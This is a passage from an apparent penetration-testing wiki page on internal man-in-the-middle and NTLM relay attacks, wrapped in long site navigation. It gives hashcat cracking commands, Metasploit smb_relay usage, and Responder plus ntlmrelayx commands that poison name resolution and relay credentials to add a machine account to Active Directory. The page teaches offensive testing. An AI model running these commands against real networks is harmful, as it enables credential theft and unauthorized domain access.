        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Cheatsheets
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Cheatsheets
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/escape-breakout/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Application Escape and Breakout
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/hash-cracking/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hash Cracking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/mimikatz-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mimikatz
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/miscellaneous-tricks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Miscellaneous & Tricks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/mssql-server-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MSSQL Server
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/network-discovery/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Network Discovery
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/powershell-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Powershell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/shell-bind-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bind Shell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/shell-reverse-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Reverse Shell Cheat Sheet
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cheatsheets/source-code-management-ci/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Source Code Management & CI/CD Compromise
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Cloud
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Cloud
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" >
        
          
          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Aws
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_1">
            <span class="md-nav__icon md-icon"></span>
            Aws
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/AWS%20Pentest/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cloud - AWS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-access-token/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Access Token & Secrets
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-cognito/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - Cognito
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-dynamodb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - DynamoDB
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-ec2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - EC2
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-enumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Enumerate
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-iam/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Identity & Access Management
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-ioc-detection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - IOC & Detections
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-lambda/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - Lambda
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-metadata/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Metadata SSRF
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-s3-bucket/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - S3 Buckets
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-ssm/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - SSM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/aws/aws-training/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Training
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
        
          
          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Azure
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_2">
            <span class="md-nav__icon md-icon"></span>
            Azure
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-access-and-token/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure AD Tokens
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-ad-connect/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure AD Connect
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-devices-users-sp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure AD IAM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-enumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure AD Enumerate
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-persistence/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Persistence
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-phishing/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure AD Phishing
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-requirements/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Requirements
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-application-endpoint/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Application Endpoint
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-application-proxy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Application Proxy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-container-registry/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Container Registry
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-deployment-template/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Deployment Template
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-devops/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Azure DevOps
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-keyvault/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - KeyVault
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-microsoft-intune/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Microsoft Intune
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-office-365/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Office 365
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-runbook/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Runbook and Automation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-storage-blob/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Storage Blob
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-virtual-machine/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Virtual Machine
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../cloud/azure/azure-services-web-apps/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Web Apps
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Command control
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Command control
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../command-control/cobalt-strike/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cobalt Strike
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../command-control/metasploit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Metasploit
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Containers
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            Containers
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../containers/docker/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../containers/kubernetes/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kubernetes
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Methodology
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            Methodology
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../methodology/bug-hunting-methodology/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bug Hunting Methodology
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../methodology/vulnerability-reports/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnerability Reports
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Redteam
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            Redteam
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1" >
        
          
          <label class="md-nav__link" for="__nav_8_1" id="__nav_8_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Access
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_1">
            <span class="md-nav__icon md-icon"></span>
            Access
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/attack-surface-enumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Subdomains Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/html-smuggling/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTML Smuggling
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/initial-access/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Initial Access
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/office-attacks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Office - Attacks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/windows-download-execute/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Download and execute methods
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/windows-using-credentials/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Using credentials
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_2" >
        
          
          <label class="md-nav__link" for="__nav_8_2" id="__nav_8_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Escalation
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_2">
            <span class="md-nav__icon md-icon"></span>
            Escalation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/escalation/linux-privilege-escalation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux - Privilege Escalation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/escalation/windows-privilege-escalation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Privilege Escalation
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_3" >
        
          
          <label class="md-nav__link" for="__nav_8_3" id="__nav_8_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Evasion
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_3">
            <span class="md-nav__icon md-icon"></span>
            Evasion
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/linux-evasion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux - Evasion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/windows-amsi-bypass/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - AMSI Bypass
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/windows-defenses/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Defenses
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/windows-dpapi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - DPAPI
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_4" >
        
          
          <label class="md-nav__link" for="__nav_8_4" id="__nav_8_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Persistence
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_4">
            <span class="md-nav__icon md-icon"></span>
            Persistence
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/persistence/linux-persistence/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux - Persistence
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/persistence/windows-persistence/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Persistence
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_5" >
        
          
          <label class="md-nav__link" for="__nav_8_5" id="__nav_8_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pivoting
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_5">
            <span class="md-nav__icon md-icon"></span>
            Pivoting
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/pivoting/network-pivoting-techniques/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Network Pivoting Techniques
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#ms08-068-ntlm-reflection" class="md-nav__link">
    <span class="md-ellipsis">
      MS08-068 NTLM reflection
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ldap-signing-not-required-and-ldap-channel-binding-disabled" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP signing not required and LDAP channel binding disabled
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#smb-signing-disabled-and-ipv4" class="md-nav__link">
    <span class="md-ellipsis">
      SMB Signing Disabled and IPv4
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#smb-signing-disabled-and-ipv6" class="md-nav__link">
    <span class="md-ellipsis">
      SMB Signing Disabled and IPv6
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#drop-the-mic" class="md-nav__link">
    <span class="md-ellipsis">
      Drop the MIC
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ghost-potato-cve-2019-1384" class="md-nav__link">
    <span class="md-ellipsis">
      Ghost Potato - CVE-2019-1384
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#remotepotato0-dcom-dce-rpc-relay" class="md-nav__link">
    <span class="md-ellipsis">
      RemotePotato0 DCOM DCE RPC relay
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dns-poisonning-relay-delegation-with-mitm6" class="md-nav__link">
    <span class="md-ellipsis">
      DNS Poisonning - Relay delegation with mitm6
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#relaying-with-webdav-trick" class="md-nav__link">
    <span class="md-ellipsis">
      Relaying with WebDav Trick
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#man-in-the-middle-rdp-connections-with-pyrdp-mitm" class="md-nav__link">
    <span class="md-ellipsis">
      Man-in-the-middle RDP connections with pyrdp-mitm
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="internal-mitm-and-relay">Internal - MITM and Relay</h1>
<p>NTLMv1 and NTLMv2 can be relayed to connect to another machine.</p>
<table>
<thead>
<tr>
<th>Hash</th>
<th>Hashcat</th>
<th>Attack method</th>
</tr>
</thead>
<tbody>
<tr>
<td>LM</td>
<td><code>3000</code></td>
<td>crack/pass the hash</td>
</tr>
<tr>
<td>NTLM/NTHash</td>
<td><code>1000</code></td>
<td>crack/pass the hash</td>
</tr>
<tr>
<td>NTLMv1/Net-NTLMv1</td>
<td><code>5500</code></td>
<td>crack/relay attack</td>
</tr>
<tr>
<td>NTLMv2/Net-NTLMv2</td>
<td><code>5600</code></td>
<td>crack/relay attack</td>
</tr>
</tbody>
</table>
<p>Crack the hash with <code>hashcat</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">hashcat</span> <span class="n">-m</span> <span class="n">5600</span> <span class="n">-a</span> <span class="n">0</span> <span class="n">hash</span><span class="p">.</span><span class="n">txt</span> <span class="n">crackstation</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div>
<h2 id="ms08-068-ntlm-reflection">MS08-068 NTLM reflection</h2>
<p>NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to Windows Server 2008.</p>
<blockquote>
<p>This vulnerability allows an attacker to redirect an incoming SMB connection back to the machine it came from and then access the victim machine using the victims own credentials.</p>
</blockquote>
<ul>
<li>https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">msf</span> <span class="p">&gt;</span> <span class="n">use</span> <span class="n">exploit</span><span class="p">/</span><span class="n">windows</span><span class="p">/</span><span class="n">smb</span><span class="p">/</span><span class="n">smb_relay</span>
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">smb_relay</span><span class="p">)</span> <span class="p">&gt;</span> <span class="n">show</span> <span class="n">targets</span>
</code></pre></div>
<h2 id="ldap-signing-not-required-and-ldap-channel-binding-disabled">LDAP signing not required and LDAP channel binding disabled</h2>
<p>During security assessment, sometimes we don't have any account to perform the audit. Therefore we can inject ourselves into the Active Directory by performing NTLM relaying attack. For this technique three requirements are needed:</p>
<ul>
<li>LDAP signing not required (by default set to <code>Not required</code>)</li>
<li>LDAP channel binding is disabled. (by default disabled)</li>
<li><code>ms-DS-MachineAccountQuota</code> needs to be at least at 1 for the account relayed (10 by default)</li>
</ul>
<p>Then we can use a tool to poison <code>LLMNR</code>, <code>MDNS</code> and <code>NETBIOS</code> requests on the network such as <code>Responder</code> and use <code>ntlmrelayx</code> to add our computer.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># On first terminal</span>
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>sudo<span class="w"> </span>./Responder.py<span class="w"> </span>-I<span class="w"> </span>eth0<span class="w"> </span>-wfrd<span class="w"> </span>-P<span class="w"> </span>-v
<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="c1"># On second terminal</span>
<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>sudo<span class="w"> </span>python<span class="w"> </span>./ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldaps://IP_DC<span class="w"> </span>--add-computer
</code></pre></div>
It is required here to relay to LDAP over TLS because creating accounts is not allowed over an unencrypted connection.</p>
<h2 id="smb-signing-disabled-and-ipv4">SMB Signing Disabled and IPv4</h2>
<p>If a machine has <code>SMB signing</code>:<code>disabled</code>, it is possible to use Responder with Multirelay.py script to perform an <code>NTLMv2 hashes relay</code> and get a shell access on the machine. Also called <strong>LLMNR/NBNS Poisoning</strong></p>
<ol>
<li>Open the Responder.conf file and set the value of <code>SMB</code> and <code>HTTP</code> to <code>Off</code>.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="no">[Responder Core]</span>
